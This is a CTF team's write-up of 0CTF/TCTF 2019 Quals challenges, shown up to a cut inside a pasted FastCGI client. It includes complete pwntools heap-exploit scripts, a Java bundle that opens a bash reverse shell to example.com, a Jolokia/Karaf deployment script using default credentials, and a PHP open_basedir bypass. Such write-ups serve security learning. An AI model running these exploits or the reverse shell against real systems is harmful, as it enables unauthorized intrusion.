# 0CTF/TCTF 2019 Quals

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/) of this writeup.**


 - [0CTF/TCTF 2019 Quals](#0ctftctf-2019-quals)
   - [Pwn](#pwn)
     - [babyaegis](#babyaegis)
     - [If on a winters night a traveler](#if-on-a-winters-night-a-traveler)
     - [zerotask](#zerotask)
     - [plang](#plang)
       - [Vulnerability](#vulnerability)
       - [Leak](#leak)
       - [exploit](#exploit)
   - [Web](#web)
     - [Ghost Pepper](#ghost-pepper)
       - [Failed Attempts](#failed-attempts)
     - [Wallbreaker Easy](#wallbreaker-easy)
       - [Solution 1: Bypass open_basedir](#solution-1-bypass-open_basedir)
       - [Solution 2: Bypass disable_function with LD_PRELOAD](#solution-2-bypass-disable_function-with-ld_preload)
       - [Failed Attempts](#failed-attempts-1)
   - [Reverse](#reverse)
     - [Elements](#elements)
     - [Fixed Point](#fixed-point)
     - [sanitize](#sanitize)
   - [Crypto](#crypto)
     - [babyRSA](#babyrsa)
     - [zer0lfsr](#zer0lfsr)
     - [zer0mi](#zer0mi)
     - [babysponge](#babysponge)
   - [Misc](#misc)
     - [flropyd](#flropyd)
     - [Neuron Break](#neuron-break)


We got 12th place in the 0CTF/TCTF 2019 Quals and make it to the finals! Also, congraz to @DragonSectorCTF, Tea Deliverers and 217. See you in the finals! 

Thanks to the organizers for such a great event! This is the most challenging CTF so far this year👏. We really enjoyed it!

## Pwn
### babyaegis

- UAF but ASAN block
- heap overflow but ASAN block
- secret have a write "\x00" arbitrary
- ASAN check value at 0xc047fff8000 , ASAN heap 0x602000000000 (no ASLR)
- allocate 0x10 size, the buffer will be at 0x602000000000
- write "\x00" at 0xc047fff8004 to overflow the ASAN chunk header.

I found overwrite chunk header, we can UAF ID 0
```python
add(0x10,"F"*0x8,100)
add(0x10,"F"*0x8,100)
for i in xrange(0x8):
  update(0,"C"*(0x9+i),100)
secret(0xc047fff8004)

for i in xrange(0x8,0xd):
  update(0,"C"*(0x9+i),100)
update(0,"A"*0xe + p64(0xffff000000024141),0x023000001003ffff)
remove(0)
add(0x10,p64(0x602000000018),0)
```

ID 2 0x0000602000000010 buf_ptr
ID 0 0x0000602000000030 buf_ptr  but 0x602000000030 is ID 2 data buffer
```
0x602000000000: 0x02ffffff00000002      0x6480000120000010
0x602000000010: 0x0000602000000030      0x0000558ca42d8ab0
0x602000000020: 0x02ffffff00000002      0x0700000120000010
0x602000000030:[0x0000602000000018]     0xbe00000000000000
0x602000000040: 0x02ffffff00000002      0x0700000120000010
0x602000000050: 0x6446464646464646      0xbe00000000000000
0x602000000060: 0x02ffffff00000002      0x6480000120000010
0x602000000070: 0x0000602000000050      0x0000558ca42d8ab0
```


show ID 0 to leak code address

using update & show to achieve arbitrary read and write.
Leak libc => leak stack => overwrite read_until_nl_or_max return address to gets & one_gadget get shell

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '111.186.63.209'
port = 6666

binary = "./aegis"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def add(size, content, iid):
  r.recvuntil(": ")
  r.sendline("1")
  r.recvuntil(": ")
  r.sendline(str(size))
  r.recvuntil(": ")
  r.send(content)
  r.recvuntil(": ")
  r.sendline(str(iid))
  pass

def update(index,content,iid):
  r.recvuntil(": ")
  r.sendline("3")
  r.recvuntil(": ")
  r.sendline(str(index))
  r.recvuntil(": ")
  r.send(content)
  r.recvuntil(": ")
  r.sendline(str(iid))
  pass

def remove(index):
  r.recvuntil(": ")
  r.sendline("4")
  r.recvuntil(":")
  r.sendline(str(index))
  pass

def show(index,start,end):
  r.recvuntil(": ")
  r.sendline("2")
  r.recvuntil(": ")
  r.sendline(str(index))
  pass
  r.recvuntil(start)
  data = r.recvuntil(end)[:-len(end)]
  return data

def secret(address):
  r.recvuntil(": ")
  r.sendline("666")
  r.recvuntil(": ")
  r.sendline(str(address))

if len(sys.argv) == 1:
  pass
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':
  add(0x10,"F"*0x8,100)
  add(0x10,"F"*0x8,100)
  for i in xrange(0x8):
    update(0,"C"*(0x9+i),100)
  secret(0xc047fff8004)
  
  for i in xrange(0x8,0xd):
    update(0,"C"*(0x9+i),100)
  update(0,"A"*0xe + p64(0xffff000000024141),0x023000001003ffff)
  remove(0)
  add(0x10,p64(0x602000000018),0)
  code = u64(show(0,"Content: ","\nID").ljust(8,"\x00")) - 0x114ab0
  print("code = {}".format(hex(code)))

  update(2,"AA",0xffffffffffffffff)
  update(2,p64(code+0x347E28) + p64(code+0x114ab0)[:2] , (code+0x114ab0)>>8)

  libc.address = u64(show(0,"Content: ","\nID").ljust(8,"\x00")) - libc.symbols['puts']
  print("libc.address = {}".format(hex(libc.address)))

  update(2,p64(libc.address+0x03EE098)[:-1], ((code+0x114ab0) << 16))

  stack = u64(show(0,"Content: ","\nID").ljust(8,"\x00"))
  print("stack = {}".format(hex(stack)))
  if len(sys.argv) == 1:
    read_until_nl_or_max_retaddr = stack - 0x158 # local
  else:
    read_until_nl_or_max_retaddr = stack - 0x150 # remote
  update(2,p64(read_until_nl_or_max_retaddr)[:-1], ((code+0x114ab0) << 16))
  sleep(0.01)
  r.sendline("3")
  sleep(0.01)
  r.sendline("0")
  sleep(0.01)
  magic = libc.address + 0x4f322
  r.send(p64(libc.symbols['gets'])[:-1])
  r.sendline("AA" + p64(magic) + "\x00"*0x50)
  sleep(0.01)
  r.sendline("ls")

  r.interactive()

```

### If on a winters night a traveler
Given a patch file and a vim binary, we're asked to exploit a patched vim. After we check the patch file, we noticed that a new encryption method `perm` was added to the vim binary. We then implemented a tiny fuzzer, fuzz the binary and got a crash immediately. By analyzing the crash, we found that the following code in `crypt_perm_decode()` is flawed:

```c
while (i < len) 
{
    if (ps->cur_idx < ps->orig_size)
    {
        to[ps->cur_idx+4] = from[i]; 
        i++;
    }
    ps->cur_idx = (ps->cur_idx + ps->step) % ps->size;
}
```
The code did not check the lower bound of `to` buffer. Since we can control `ps->step`, `ps->cur_idx` can actually be a negative number, which leads to a heap buffer underflow vulnerability.

To exploit the service, we:
1. Use the vulnerability to overwrite the `ps->buffer` pointer and change it to `free@got.plt - 9`
2. Overwrite `ps->cur_idx` ( 1 byte ) so next time `ps->cur_idx` will be a positive number. This allow us to control the content of `to[positive_index]`.
3. Later when we run into the following code:
```c
for (i = 0; i < ps->shift; ++i)
    ps->buffer[i] = to[i+4];
```
Since we can control `to[i+4]`, we actually have an arbitrary write primitive. We decided to overwrite `free@got.plt` to `0x4C915d`, which contains the following gadget:
```
mov r8d, 0
mov rcx, rax
lea rdx, aC_2 ; "-c"
lea rsi, arg ; "sh"
lea rdi, path ; "/bin/sh"
mov eax, 0
call _execl
```

We found that while doing `free(ps->buffer)`, rax will store the value of `ps->buffer`, which means this gadget allow us to call `execl("/bin/sh","sh","-c",ps->buffer)` eventually, and that's how we achieve remote code execution.

final exploit:
```python
#!/usr/bin/env python
from pwn import *
import subprocess as sp
from ctypes import *
import hashlib
import string
import itertools

# flag{Th4t_st0ry_I_to1d_you_abOut_thE_boy_poet_aNd_th3_girl_poet,_Do_y0u_r3member_thAt?_THAT_WASN'T_TRUE._IT_WAS_SOMETHING_I_JUST_MADE_UP._Isn't_that_the_funniest_thing_you_have_heard?}

sss = string.letters + string.digits

y = remote("111.186.63.13",10001)

def pow():
    y.recvuntil("sha256(XXXX+")
    suffix = y.recvuntil(")")[:-1:]
    y.recvuntil("== ")
    answer = y.recvline().strip()
    log.info("suffix: "+suffix)
    log.info("hash: "+answer)
    for c in itertools.product(sss, repeat=4):
        XXXX = ''.join(c)
        temp = XXXX + suffix
        h = hashlib.sha256(temp).hexdigest()
        if h == answer:
            log.success("XXXX: {}".format(XXXX))
            y.sendlineafter("XXXX:", XXXX)
            break

pow()

e = ELF('./vim')

_size = 0x16 + 8 + 1 + 8 + 8
size = 0x35
IV = 0xffffffff ^ 0x61

f = "VimCrypt~04!"
f += p32(IV)[::-1]

p = 'y' * 0x15
p += p64( e.got['free'] - 9 )[::-1]
p += '\x1b'
p += p64( 0x4C915d )[::-1]
p += 'cat flag'.ljust( 9 , '\0' )[::-1]
f += p.ljust( size , '\x00' )

y.sendlineafter( 'OK' , str( len( f ) ) )
y.send( f )

y.interactive()
```

### zerotask

Race Condition to leak address
Then create fake structure to jump to one_gadget
```python
from pwn import *
context.arch = "amd64"

#r = process(["./task"])
r = remote("111.186.63.201", 10001)
from Crypto.Cipher import AES

IV = "a"*0x10

def aes_encrypt(data, key):
    cryptor = AES.new(key, AES.MODE_CBC, IV)
    return cryptor.encrypt(data)

def aes_decrypt(data, key):
    cryptor = AES.new(key, AES.MODE_CBC, IV)
    return cryptor.decrypt(data)

def add(idx,Type,key,iv,size,data):
        payload = flat("1".ljust(8,'\x00'),str(idx).ljust(8,'\x00'),
                    str(Type).ljust(8,'\x00'),key,iv,
                    str(size).ljust(8,'\x00'),data)
        global gogo
        if gogo:
            r.send(payload)
        else:
            r.sendafter("Choice:",payload)

def go(idx):
	r.sendlineafter(":","3")
	r.sendlineafter(":",str(idx))

def remove(idx):
	r.sendlineafter(":","2")
	r.sendlineafter(":",str(idx)) 


gogo = False

add(0,1,"a"*0x20,"a"*0x10,0x70,"a"*0x70)
add(1,1,"a"*0x20,"a"*0x10,0x70,"a"*0x70)
add(2,1,"a"*0x20,"a"*0x10,0x70,"a"*0x70)
remove(2)
go(0)
remove(0)
remove(1)
add(3,1,"a"*0x20,"a"*0x10,0x1,"a"*0x1)
add(4,1,"a"*0x20,"a"*0x10,0x1,"a"*0x1)
r.recvuntil("Ciphertext:")
r.recvline()
x = r.recvline()[:-1].split()
ans = ""
for xx in x:
    ans+= chr(int(xx,16))
data = aes_decrypt(ans,"a"*0x20)[:8]
heap = u64(data)
print hex(heap)

gogo = True
add(5,1,"a"*0x20,"a"*0x10,0x70,"a"*0x70)
gogo = False
add(6,1,"a"*0x20,"a"*0x10,0x10,"a"*0x10)
go(5)
remove(5)
remove(6)

fake = flat( heap+0x720,0x70,p32(1),"a"*0x30+p32(0),0,0,heap+0x420)
add(7,1,"a"*0x20,"a"*0x10,0x70,fake.ljust(0x70,"\x00"))
add(8,1,"a"*0x20,"a"*0x10,0x500,"a"*0x500)
add(9,1,"a"*0x20,"a"*0x10,0x10,"a"*0x10)
remove(8)

r.recvuntil("Ciphertext:")
r.recvline()
x = r.recvline()[:-1].split()
ans = ""
for xx in x:
        ans+= chr(int(xx,16))
data = aes_decrypt(ans,"a"*0x20)[:8]
libc = u64(data)-0x3ebca0
print hex(libc)


gogo = True
add(5,1,"a"*0x20,"a"*0x10,0x70,"a"*0x70)
gogo = False
add(6,1,"a"*0x20,"a"*0x10,0x10,"a"*0x10)
add(7,1,"a"*0x20,"a"*0x10,0x100,p64(heap+0xf10)+p64(0)+p64(0)*4+p64(libc+0x10a38c)+"/bin/sh\x00"+p64(0)*0x18)
go(5)
remove(5)
remove(6)
fake = flat( heap+0xf38,0x70,p32(1),"a"*0x30+p32(0),0,0,heap+0xf00)
add(7,1,"a"*0x20,"a"*0x10,0x70,fake.ljust(0x70,"\x00"))


import time
time.sleep(2)
r.interactive()

```
### plang

We are given some files, including one `plang` binary and one PoC code. The `plang` binary acts like an interpreter. And the PoC code can make `plang` get segmentation fault, which points out the direction to the vulnerability in `plang`.

#### Vulnerability

It should be easy to find out that we can use negative indexes to overwrite other objects. And it's obvious that we can only modify the objects at lower address, which means we can only modify the earlier objects.

```
var a = "This is a PoC!"
System.print(a)
var b = [1, 0x123, 3, 7 , 8]
var c = [75, 0x123, 3, 7 , 20]
c[-0x36]=1234
System.print(b)

> > This is a PoC!
> > > > [1234,291,3,7,8]
```

But we cannot use this trick to leak information on heap, since we can only use negative index for assignment.

#### Leak

Then I found that we can modify the length of string object. Therefore, we can leverage modified string object to leak heap address.

```
var a = "This is a Po"
System.print(a)
var b = [1, 0x123, 3, 7 , 8]
var c = [75, 0x123, 3, 7 , 0,40]
c[-0xe0]=1 # This actually change the length of a into 0x3ff0000000000000
System.print(c[0])
System.print(a[0x30]+a[0x31]+a[0x32]+a[0x33]+a[0x34]+a[0x35]+a[0x36]+a[0x37]) # leak heap address
```

Here is a limitation of this trick, we can only leak information at higher address. However there is no libc address at higher address on heap.

Fortunately, I found some native objects and libc address at lower address on heap. Since `plang` implement `toString` for every native class, we can modify these string objects to leak libc address as well as text address.


```
var a = "This is a Po"
System.print(a)
var b = [1, 0x123, 3, 7 , 8]
var c = [75, 0x123, 3, 7 , 0,40]
c[-0xe0]=1
c[-0xeaa]=1
System.print(c[0])
System.print(a[0x30]+a[0x31]+a[0x32]+a[0x33]+a[0x34]+a[0x35]+a[0x36]+a[0x37])
var lib=Num.toString
System.print(lib[0x18]+lib[0x19]+lib[0x1a]+lib[0x1b]+lib[0x1c]+lib[0x1d]) # leak libc address
System.print(lib[0xd378]+lib[0xd379]+lib[0xd37a]+lib[0xd37b]+lib[0xd37c]+lib[0xd37d]) # leak text address
```

#### exploit

At the end, I found a function address at 0x21E050. Since I have all the address I need, I can easily overwrite the function address with one gadget and get the shell. 
By the way, you have to encode the one gadget address in `double` format, because all the number in the array are in `double` format


exploit script:
```python
from pwn import *
import struct
#r=process("./plang")
r=remote("111.186.63.210", 6666)


payload='''var a = "This is a Po"
System.print(a)
var b = [1, 0x123, 3, 7 , 8]
var c = [75, 0x123, 3, 7 , 0,40]
c[-0xe0]=1
c[-0xeaa]=1
System.print(c[0])
System.print(a[0x30]+a[0x31]+a[0x32]+a[0x33]+a[0x34]+a[0x35]+a[0x36]+a[0x37])
var lib=Num.toString
System.print(lib[0x18]+lib[0x19]+lib[0x1a]+lib[0x1b]+lib[0x1c]+lib[0x1d])
System.print(lib[0xd378]+lib[0xd379]+lib[0xd37a]+lib[0xd37b]+lib[0xd37c]+lib[0xd37d])
'''
# use payload to leak the addresses of heap, libc, text
r.sendline(payload)
r.recvuntil("75")
r.recvline()
r.recvuntil("> ")


k=r.recvline()[:-1]
heap=u64(k+"\x00\x00")-0xd710
print "heap:"+hex(heap)


r.recvuntil("> > ")
k=r.recvline()[:-1]
lib=u64(k+"\x00\x00")-0x3ebd20
print "lib:"+hex(lib)


r.recvuntil("> ")
k=r.recvline()[:-1]
text=u64(k+"\x00\x00")-0x11504
print "text:"+hex(text)


offset=0x16160+heap-text-0x21E050
print "offset:"+hex(offset)
print "function pointer:"+hex(text+0x21E050)
onegadget=lib+(0x4f322)
print "onegadget:"+hex(onegadget)

vv="%.330f" % struct.unpack("d",p64(onegadget))[0] #encode one gadget address

r.sendline("c["+"-"+str(offset/16)+"]="+vv)
r.sendline("var whatever=1") # trigger one gadget
r.sendline("cat flag") #flag{Th1s_language_is_4_bit_p00r}
r.interactive()
```


## Web

### Ghost Pepper

The server is running java-based web server `jetty`, deployed in Apache Karaf. The landing page is protected by HTTP Basic authentication. The default credential is `karaf/karaf` according to [the doc](https://karaf.apache.org/manual/latest/webconsole). The realm also indicates it's based on karaf.

Then we have no idea what to do next. I asked admin if scanning is allowed in this challenge. Surprisingly it's yes, and the admin also (accidentally?) posted a link `http://111.186.63.207:31337/jolokia/`. Jolokia is a JMX-HTTP bridge used to access JMX MBeans remotely. It's also known as a kind of pepper...... 

We first list all the Jolokia supported operation via `/jolokia/list`. Only Java class is listed here:

```
java.util.logging
org.eclipse.jetty.server.session
org.ops4j.pax.web.service.jetty.internal
org.eclipse.jetty.jmx
osgi.compendium
java.nio
org.apache.karaf
JMImplementation
org.eclipse.jetty.util.thread
java.lang
com.sun.management
jmx4perl
connector
sun.nio.ch
org.eclipse.jetty.server
org.apache.aries.blueprint
org.eclipse.jetty.io
osgi.core
jolokia
```

The `org.apache.karaf` class is interesting. [It](https://karaf.apache.org/manual/latest-3.0.x/monitoring) seems like we can perform various operation via Karaf JMX. Let's list all the methods that Karaf supports:

```
name=root,type=http
{'Servlets': {'rw': False, 'type': 'javax.management.openmbean.TabularData', 'desc': 'Attribute exposed for management'}}
name=root,type=config
['getProperty', 'install', 'setProperty', 'update', 'create', 'createFactoryConfiguration', 'listProperties', 'delete', 'appendProperty', 'deleteProperty']
name=root,type=bundle
['getStartLevel', 'resolve', 'stop', 'uninstall', 'install', 'restart', 'start', 'update', 'refresh', 'setStartLevel', 'getStatus', 'getDiag']
frameworkUUID=d3e4dc5b-876c-4e71-a679-6da5d6fd588d,type=RegionDigraph
['getRegion']
name=root,type=log
['getLevel', 'setLevel']
name=root,type=service
['getServices']
name=root,type=feature
['addRepository', 'installFeature', 'refreshRepository', 'uninstallFeature', 'infoFeature', 'removeRepository']
frameworkUUID=d3e4dc5b-876c-4e71-a679-6da5d6fd588d,name=root,type=Region
{'BundleIds': {'rw': False, 'type': '[J', 'desc': 'BundleIds'}, 'Dependencies': {'rw': False, 'type': '[Ljavax.management.ObjectName;', 'desc': 'Dependencies'}, 'Name': {'rw': False, 'type': 'java.lang.String', 'desc': 'Name'}}
name=root,type=instance
['stopInstance', 'changeRmiRegistryPort', 'createInstance', 'cloneInstance', 'destroyInstance', 'changeSshPort', 'changeSshHost', 'renameInstance', 'startInstance', 'changeJavaOpts', 'changeRmiServerPort']
area=jmx,name=root,type=security
['canInvoke']
name=root,type=system
['rebootCleanAll', 'reboot', 'halt', 'getProperty', 'setProperty', 'getProperties', 'rebootCleanCache']
name=root,type=kar
['uninstall', 'install', 'create']
name=root,type=package
['getImports', 'getExports']
name=root,type=diagnostic
['createDump']
name=root,type=scr
['componentState', 'activateComponent', 'isComponentActive', 'listComponents', 'deactivateComponent']
```

Bingo! There are lots of operation named `install`. We can probably exploit those API to deploy our malicious application. According to the [documents](http://karaf.apache.org/manual/latest/#_jmx_karmbean), we can deploy either a KAR or a bundle to the server to RCE.  [Here] is a good article explaining how to deploy a KAR/bundle. The author also provives [a hello-world bundle on Github](https://github.com/moghaddam/developmentor/blob/master/helloworld/target/helloworld-1.0.0.jar).

Based on the hello-world bundle, we modified it to create a reverse webshell:

```javas
//Activator.java
package com.blogspot.developmentor;

import org.osgi.framework.BundleActivator;
import org.osgi.framework.BundleContext;

public class Activator implements BundleActivator {

    public void start(BundleContext context) {
      try {
        Runtime.getRuntime().exec(new String[]{"bash", "-c", "bash -i >& /dev/tcp/example.com/12345 0>&1"}).waitFor();
      } catch (java.io.IOException e) {
      } catch(java.lang.InterruptedException ex) {
      }
    }

    public void stop(BundleContext context) {
    }

}
```

Then run `mvn clean compile package` and the following script to deploy the bundle automatically! Just set the secoond parameter to `true`.

```python
#!/usr/bin/env python3

import requests
from requests.auth import HTTPBasicAuth
s =requests.session()
auth = HTTPBasicAuth('karaf', 'karaf')
json = {
    'type': 'EXEC',
    "mbean" : "org.apache.karaf:name=root,type=bundle",
    "operation": "install(java.lang.String, boolean)",
    "arguments" : ['http://example.com/helloworld-1.0.0.jar', True]
}                                                                                                                                                  
r = s.post('http://111.186.63.207:31337/jolokia', auth=auth, json=json)
```

The flag is `flag{DOYOULOVEJOLOKIA?ILOVEITVERYMUCH}`.


#### Failed Attempts

- jetty 9.3.24 CVE: Unfortunately [most of the Jetty CVEs](https://github.com/eclipse/jetty.project/blob/9b7afd8a0341f4712031abd322ab8669f07f5c5b/jetty-documentation/src/main/asciidoc/reference/troubleshooting/security-reports.adoc) are fixed in 9.3.24.
- [Karaf CVE](https://karaf.apache.org/security/) and the [zip-slip CVE](https://nvd.nist.gov/vuln/detail/CVE-2019-0191): but we have to deploy our application first!
- Karaf webconsole: The default port `8081` is not opened. I think the webconsole is not enabled.
- Download `WEB-INF/web.xml`: Jetty [protects the path](https://github.com/eclipse/jetty.project/blob/jetty-9.4.x/jetty-server/src/main/java/org/eclipse/jetty/server/handler/ContextHandler.java#L1468-L1492) pretty well. I tried to fuzz it but failed. It also considers the [URL parameters](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf) like `/foo;bar=b/bazz`. It's very robust.


### Wallbreaker Easy

#### Solution 1: Bypass open_basedir

- `phpinfo()`
    - `FPM/FastCGI`
    - `disable_functions`: `pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail`

- We can use `glob` to bypass `open_basedir`
    - only listing directory/file name
    - we can't read it.

```php
$file_list = array();
$it = new DirectoryIterator("glob:///v??/run/php/*");
foreach($it as $f) {  
    $file_list[] = $f->__toString();
}
echo 1234;
$it = new DirectoryIterator("glob:///v??/run/php/.*");
foreach($it as $f) {  
    $file_list[] = $f->__toString();
}
sort($file_list);  
foreach($file_list as $f){  
        echo "{$f}<br/>";
}
```

then I found the php-fpm unix socket is `/var/run/php/php7.2-fpm.sock`

and some other users files under `/tmp`:

```
phpjU1MT8
gbm.mvg
out.txt
a.mvg
hook_setlocale.so
test.docx
flag6HQiRO
flagP172KD
flagXf9Py9
imgLr0ONK
imgdmFOiN
imgtTneHL
test
input
lib.so
haha.jpg
haha.so
magick-15IU6hkSBzxfQU
magick-15_c-AyGpZV64Y
magick-15c0SdVOY2t0Rw
magick-35PXaz2p6YWcU9
poc
poc.php
index.php
rsvg-convert
1
ggg.png
|file -
ps.txt
bypass_disablefunc.php
bypass_disablefunc_x64.so
image1
image1.png
testXXXX

awesomefoo.jpg
awesomefoo.mvg
rpisec.mvg
a.php
kaibro.so
1.php
poc.php
poc.xml
lib
1
bypass_disablefunc_x64.so
bypass_disablefunc_x64.so
shell.php
magick-11kjeXi6XXo8aI
magick-16CyaWpHQXyZLq
magick-16xld7O5CUZKaV
rsvg-convert
someimg3.jpg
a.php
kaibro.so
some_dudes_output.mvg
adami.so
input
out
dupa.so
flag
flag0MCNNZ
imgoTDOnX
outimgQpENAY
imgaaa.svg
shell.jpg
imgaaa.svg
ps.svg
vvvvvaIfIgR.mvg
bypass_disablefunc_x64.so
out.ilbm
out.txt
test.php
gbm.jpg
awesomefoo.gif
adami.so
dupa
dupax
input
lib.so
out
haha.jpg
haha.so
cat.jpg
shell.jpg
vvvvvgMbpZ1.mvg
vvvvvgfxLId.mvg
poc.png
png.la
orange.so
wdwd1.so

php8PGzRh
phpMMksxY
phpWuofwP
phpi4mT51
phpuVbj0w
otsosi
rsvg-convert
gbm.jpg
someimg6.jpg
awesomefoo.gif
awesomefoo.ps
a.php
kaibro.so
adami.so
dupa
dupax
dupay
input
lib.so
out
xD
haha.jpg
haha.so
dupa.so
flag
flaggF33r6
cat.jpg
shell.jpg
foobar.x
awesomefoo.gif
poc.png
exploit.php
png.la
png.so
orange.so
bypass_disablefunc_x64.so
out.ilbm
out.txt
test.php
wdwd1.so
wdwd2.php
testXXXX.ps
```

And I know I can forge fastcgi to bypass some security policies. (e.g. `open_basedir`)

So I modify [this script](https://gist.github.com/wofeiwo/4f41381a388accbf91f8) to forge fastcgi protocol to execute some malicious php code without `open_basedir`

```php
<?php
/**
 * Note : Code is released under the GNU LGPL
 *
 * Please do not change the header of this file
 *
 * This library is free software; you can redistribute it and/or modify it under the terms of the GNU
 * Lesser General Public License as published by the Free Software Foundation; either version 2 of
 * the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 * See the GNU Lesser General Public License for more details.
 */
/**
 * Handles communication with a FastCGI application
 *
 * @author      Pierrick Charron <pierrick@webstart.fr>
 * @version     1.0
 */
class FCGIClient
{
    const VERSION_1            = 1;
    const BEGIN_REQUEST        = 1;
    const ABORT_REQUEST        = 2;
    const END_REQUEST          = 3;
    const PARAMS               = 4;
    const STDIN                = 5;
    const STDOUT               = 6;
    const STDERR               = 7;
    const DATA                 = 8;
    const GET_VALUES           = 9;
    const GET_VALUES_RESULT    = 10;
    const UNKNOWN_TYPE         = 11;
    const MAXTYPE              = self::UNKNOWN_TYPE;
    const RESPONDER            = 1;
    const AUTHORIZER           = 2;
    const FILTER               = 3;
    const REQUEST_COMPLETE     = 0;
    const CANT_MPX_CONN        = 1;
    const OVERLOADED           = 2;
    const UNKNOWN_ROLE         = 3;
    const MAX_CONNS            = 'MAX_CONNS';
    const MAX_REQS             = 'MAX_REQS';
    const MPXS_CONNS           = 'MPXS_CONNS';
    const HEADER_LEN           = 8;
    /**
     * Socket
     * @var Resource
     */
    private $_sock = null;
    /**
     * Host
     * @var String
     */
    private $_host = null;
    /**
     * Port
     * @var Integer
     */
    private $_port = null;
    /**
     * Keep Alive
     * @var Boolean
     */
    private $_keepAlive = false;
    /**
     * Constructor
     *
     * @param String $host Host of the FastCGI application
     * @param Integer $port Port of the FastCGI application
     */
    public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
    {
        $this->_host = $host;
        $this->_port = $port;
    }
    /**
     * Define whether or not the FastCGI application should keep the connection
     * alive at the end of a request
     *
     * @param Boolean $b true if the connection should stay alive, false otherwise
     */
    public function setKeepAlive($b)
    {
        $this->_keepAlive = (boolean)$b;
        if (!$this->_keepAlive && $this->_sock) {
            fclose($this->_sock);
        }
    }
    /**
     * Get the keep alive status
     *
     * @return Boolean true if the connection should stay alive, false otherwise
     */
    public function getKeepAlive()
    {
        return $this->_keepAlive;
    }
    /**
     * Create a connection to the FastCGI application
     */
    private function connect()
    {
        if (!$this->_sock) {
            $this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
            if (!$this->_sock) {
                throw new Exception('Unable to connect to FastCGI application');
            }
        }
    }
    /**
     * Build a FastCGI packet
     *
     * @param Integer $type Type of the packet
     * @param String $content Content of the packet
     * @param Integer $requestId RequestId
     */
    private function buildPacket($type, $content, $requestId = 1)
    {
        $clen = strlen($content);
        return chr(self::VERSION_1)         /* version */
            . chr($type)                    /* type */
            . chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
            . chr($requestId & 0xFF)        /* requestIdB0 */
            . chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
            . chr($clen & 0xFF)             /* contentLengthB0 */
            . chr(0)                        /* paddingLength */
            . chr(0)                        /* reserved */
            . $content;                     /* content */
    }
    /**
     * Build an FastCGI Name value pair
     *
     * @param String $name Name
     * @param String $value Value
     * @return String FastCGI Name value pair
     */
    private function buildNvpair($name, $value)
    {
        $nlen = strlen($name);
        $vlen = strlen($value);
        if ($nlen < 128) {
            /* nameLengthB0 */
            $nvpair = chr($nlen);
        } else {
            /* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
            $nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
        }
        if ($vlen < 128) {
            /* valueLengthB0 */
            $nvpair .= chr($vlen);
        } else {
            /* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
            $nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
        }
        /* nameData & valueData */
        return $nvpair . $name . $value;
    }
    /**
     * Read a set of FastCGI Name value pairs
     *
     * @param String $data Data containing the set of FastCGI NVPair
     * @return array of NVPair
     */
    private function readNvpair($data, $length = null)
    {
        $array = array();
        if ($length === null) {
            $length = strlen($data);
        }
        $p = 0;
        while ($p != $length) {
            $nlen = ord($data{$p++});
            if ($nlen >= 128) {
                $nlen = ($nlen & 0x7F << 24);
                $nlen |= (ord($data{$p++}) << 16);
                $nlen |= (ord($data{$p++}) << 8);
                $nlen |= (ord($data{$p++}));
            }
            $vlen = ord($data{$p++});
            if ($vlen >= 128) {
                $vlen = ($nlen & 0x7F << 24);
                $vlen |= (ord($data{$p++}) << 16);
                $vlen |= (ord($data{$p++}) << 8);
                $vlen |= (ord($data{$p++}));
            }
            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
            $p += ($nlen + $vlen);
        }
        return $array;
    }
    /**
     * Decode a FastCGI Packet
     *
     * @param String $data String containing all the packet
     * @return array
     */
    private function decodePacketHeader($data)
    {
        $ret = array();
        $ret['version']       = ord($data{0});
        $ret['type']          = ord($data{1});
        $ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
        $ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
        $ret['paddingLength'] = ord($data{6});
        $ret['reserved']      = ord($data{7});
        return $ret;
    }
    /**
     * Read a FastCGI Packet
     *
     * @return array
     */
    private function readPacket()
    {
        if ($packet = fread($this->_sock, self::HEADER_LEN)) {
            $resp = $this->decodePacketHeader($packet);
            $resp['content'] = '';
            if ($resp['contentLength']) {
                $len  = $resp['contentLength'];
                while ($len && $buf=fread($this->_sock, $len)) {
                    $len -= strlen($buf);
                    $resp['content'] .= $buf;
                }
            }
            if ($resp['paddingLength']) {
                $buf=fread($this->_sock, $resp['paddingLength']);
            }
            return $resp;
        } else {
            return false;
        }
    }
    /**
     * Get Informations on the FastCGI application
     *
     * @param array $requestedInfo information to retrieve
     * @return array
     */
    public function getValues(array $requestedInfo)
    {
        $this->connect();
        $request = '';
